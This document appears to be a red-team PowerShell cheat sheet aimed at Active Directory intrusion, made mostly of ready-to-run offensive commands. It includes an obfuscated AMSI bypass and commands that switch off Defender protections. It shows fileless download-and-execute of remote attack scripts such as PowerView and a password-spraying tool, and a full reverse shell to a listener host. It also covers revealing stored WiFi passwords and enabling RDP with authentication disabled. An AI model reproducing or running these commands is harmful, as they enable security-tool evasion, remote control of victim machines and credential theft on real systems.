---
description: Cheat Sheet for Active Directory Red Teaming
---

# Cheat-Sheet Powershell

## Execution Policy Bypass methods

```
powershell -ep bypass
powershell -c [cmd]
powershell ExecutionPolicy bypass
powershell encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

## AMSI Bypass

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Disabling AntiVirus/Malware Protection (Requires Admin Rights)

```
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

## Downloading Files

```
certutil.exe -urlcache -f http://10.0.0.5/lazypentester.exe lazypentester.exe
certutil -urlcache -split -f http://10.10.14.20/lazypentester.ps1
```

## Importing Powershell Module

Import locally saved module&#x20;

```
Import-Module [path]
..\ModuleName.ps1
```

Import-Module  from web

```
//commonly used
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

//Powershell v3 onwards
iex (iwr 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1',$false);$h.send();iex $h.responseText

$wr = [System.NET.WebRequest]::Create("https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

//didn't work for me
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

## Check Privileges of the current session

```
whoami /priv
```

## List out All Available Commands

```
Get-Command -CommandType cmdlet
```

## Install MSI files as Administrator from Powershell (requires admin Rights)

```
Start-Process msiexec.exe '/i "C:\path\Nessus-8.7.1-x64.msi" /qf' -Verb RunAs
```

## Start New Powershell Console as Administrator from current Powershell running as admin

```
Start-Process powershell  -Verb RunAs
```

## Show WiFi Password in CMD or PowerShell

Show all stored SSID's(wifi network names)

```
netsh wlan show profiles
```

To Display Password of a wifi network (SSID)

```
netsh wlan show profile [wifi_name] key=clear
```

## Reverse Shell

```
\\hosting payload
python -m SimpleHTTPServer 1337

\\listening with powercat
powercat -l -p 423

\\on victim 
iex (iwr 'http://172.16.100.82:1337/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.82 -Port 423
powershell.exe "iex (New-Object Net.WebClient).DownloadString('http://172.16.100.82:1337/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.82 -Port 443"
```

## History in Powershell&#x20;

```
Get-History
```

## Enable RDP

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

